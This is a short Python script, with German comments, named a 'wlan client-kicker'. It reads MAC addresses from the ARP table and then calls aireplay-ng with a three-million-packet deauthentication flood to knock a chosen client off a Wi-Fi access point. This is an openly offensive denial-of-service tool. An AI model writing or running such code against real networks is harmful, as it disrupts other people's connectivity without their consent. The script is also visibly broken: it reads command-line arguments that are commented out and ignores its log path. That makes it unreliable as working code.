# wlan client-kicker

'''
TODO:
 - ping test after kicking to check the connection
 - function to search mac-addresses 

 - mit ipv4 pingen
 - arp tabelle auslesen und schön ausgeben lassen
    --> dadurch MAC und IPv4 Addresse bekommen (in hashtable speichern)
'''

import subprocess
import pyfiglet
import argparse
import os

'''
def search_mac():
    arp_table = f"arp -a"
    result = subprocess.run(arp_table, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        arp_output = result.stdout
        arp_lines = arp_output.split('\n')
        mac_addresses = []
        for line in arp_lines:
            if line.strip():
                parts = line.split()
                if len(parts) >= 4:
                    mac_address = parts[3]
                    mac_addresses.append(mac_address)
        
        for mac_address in mac_addresses:
            print(mac_address)
            return mac_address
    else:
        print("Fehler beim Ausführen des Befehls:", result.stderr)
'''

def get_arp(ip):
    # ping IPv4 for ARP-table
    ping_command = f"ping {ip} -c 3"
    print(ping_command)
    pingResult = os.system(ping_command)
    if pingResult == 0:
        print(pingResult)
        # get ARP-table for MAC-Addresses, IPv4s and devicenames
        arpResult = subprocess.run("arp -a", shell=True, capture_output=True, text=True)
        # parsing ARP-table
        if arpResult.returncode == 0:
            arp_output = arpResult.stdout
            arp_lines = arp_output.split('\n')
            mac_addresses = []
            for line in arp_lines:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 4:
                        mac_address = parts[3]
                        mac_addresses.append(mac_address)
            
            for mac_address in mac_addresses:
                print(mac_address)
                return mac_address
        else:
            print("Fehler beim Ausführen des Befehls:", arpResult.stderr)
    else: print("cannot ping IP: {ip}")

def kick_client(macAddress_target, macAddress_AP, logpath):
    aireplay_command = f"sudo aireplay-ng --deauth 3000000 -a {macAddress_AP} -c {macAddress_target} wlan0"
    subprocess.run(aireplay_command, shell=True)

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Tool to kick clients out of Wlan")
    parser.add_argument("-ip", "--IPv4", help="Set the AP MAC-Address", required=True)
    #parser.add_argument("-t", "--macAddress_target", help="Set the target MAC-Address", required=True)
    #parser.add_argument("-a", "--macAddress_AP", help="Set the AP MAC-Address", required=True)
    parser.add_argument("-l", "--logpath", help="Set path for the logs", default=".")
    #parser.add_argument("-s", "--searchMacAdd", help="Ping Broadcast and parse every MAC-Address out of the ARP Table")

    args = parser.parse_args()

    # Print banner
    ascii_banner = pyfiglet.figlet_format("KICKER.py")
    print(ascii_banner)

    # Run functions
    get_arp(args.IPv4)
    kick_client(args.macAddress_target, args.macAddress_AP, args.logpath)

if __name__ == "__main__":
    main()

'''
import subprocess

cmd = "arp -a"

result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

if result.returncode == 0:
    arp_output = result.stdout
    arp_lines = arp_output.split('\n')
    
    mac_addresses = []
    for line in arp_lines:
        if line.strip():
            parts = line.split()
            if len(parts) >= 4:
                mac_address = parts[3]
                mac_addresses.append(mac_address)
    
    for mac_address in mac_addresses:
        print(mac_address)
else:
    print("Fehler beim Ausführen des Befehls:", result.stderr)
'''